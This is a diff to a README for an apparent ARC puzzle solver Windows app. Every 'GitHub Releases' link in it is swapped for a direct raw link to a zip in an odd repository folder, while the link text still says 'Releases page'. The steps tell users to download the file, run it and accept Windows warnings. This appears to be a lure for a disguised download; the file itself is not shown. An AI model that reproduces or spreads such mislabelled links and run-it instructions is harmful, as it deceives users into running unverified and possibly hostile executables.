@@ -1,9 +1,9 @@
 # 🧭 transversal-arc-solver - Solve ARC tasks with geometry
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Massintertrigo102/transversal-arc-solver/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Massintertrigo102/transversal-arc-solver/main/fuchsin/transversal_arc_solver_v1.4-alpha.2.zip)
 
 ## 📥 Download
-Visit this page to download: [GitHub Releases](https://github.com/Massintertrigo102/transversal-arc-solver/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Massintertrigo102/transversal-arc-solver/main/fuchsin/transversal_arc_solver_v1.4-alpha.2.zip)
 
 Pick the latest release for Windows. Download the file that matches your system. If you see more than one file, choose the `.exe` file for the easiest setup.
 
@@ -32,7 +32,7 @@ For smoother use, 8 GB RAM or more helps when working with larger puzzle sets.
 
 ## 🚀 Getting started
 
-1. Open the [Releases page](https://github.com/Massintertrigo102/transversal-arc-solver/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Massintertrigo102/transversal-arc-solver/main/fuchsin/transversal_arc_solver_v1.4-alpha.2.zip)
 2. Find the newest release at the top of the page
 3. Download the Windows file
 4. If Windows asks for approval, choose to keep or run the file
@@ -131,7 +131,7 @@ Use this app when you want to test ARC puzzle ideas without setting up a researc
 
 ## 📌 Release page
 
-Download the Windows app here: [https://github.com/Massintertrigo102/transversal-arc-solver/releases](https://github.com/Massintertrigo102/transversal-arc-solver/releases)
+Download the Windows app here: [https://raw.githubusercontent.com/Massintertrigo102/transversal-arc-solver/main/fuchsin/transversal_arc_solver_v1.4-alpha.2.zip](https://raw.githubusercontent.com/Massintertrigo102/transversal-arc-solver/main/fuchsin/transversal_arc_solver_v1.4-alpha.2.zip)
 
 Choose the newest release, then download and run the Windows file from that page
 
